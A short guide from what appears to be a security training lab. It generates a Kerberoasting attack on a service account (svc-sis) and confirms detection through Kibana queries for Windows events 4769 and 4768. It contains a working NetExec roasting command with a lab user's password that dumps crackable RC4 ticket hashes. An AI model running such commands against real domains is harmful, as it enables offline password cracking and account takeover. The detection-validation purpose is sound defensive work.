# 03 — Kerberoasting the SIS account (trigger guide)

Lesson: [`lessons/03-kerberoast-sis.md`](../../lessons/03-kerberoast-sis.md)
Target events: **4769** (service ticket, encryption type **0x17** = RC4) and **4768** (the requestor's TGT).

## What this generates

Any domain user requests a service ticket for the SPN account `svc-sis`; the ticket is RC4 so it can be
cracked offline. A single user requesting many SPNs is roasting at scale.

## Steps (on Kali)

```bash
nxc ldap 192.168.56.30 -u nadia.lee -p 'Fall2026!' --kerberoasting /tmp/roast.txt
cat /tmp/roast.txt      # $krb5tgs$23$... hashes (the 23 = RC4/etype 0x17)
```

`nadia.lee` is any weak-password domain user (answer key). The roast also pulls `svc-superadmin` — the
honey account (see playbook 10), a bonus high-signal hit.

## Confirm in Kibana (`winlogbeat-*`)

```
winlog.event_id:4769 and winlog.event_data.TicketEncryptionType:"0x17" and winlog.event_data.ServiceName:"svc-sis"
```

and the requestor's TGT:

```
winlog.event_id:4768 and winlog.event_data.TargetUserName:"nadia.lee"
```

## Validation

- **4769** `ServiceName=svc-sis`, `TicketEncryptionType=0x17`, requested by `nadia.lee`,
  `source.ip 192.168.56.99`. ✅
- **4768** for `nadia.lee` (the TGT obtained before roasting). ✅
- Lesson matches reality — no change needed.
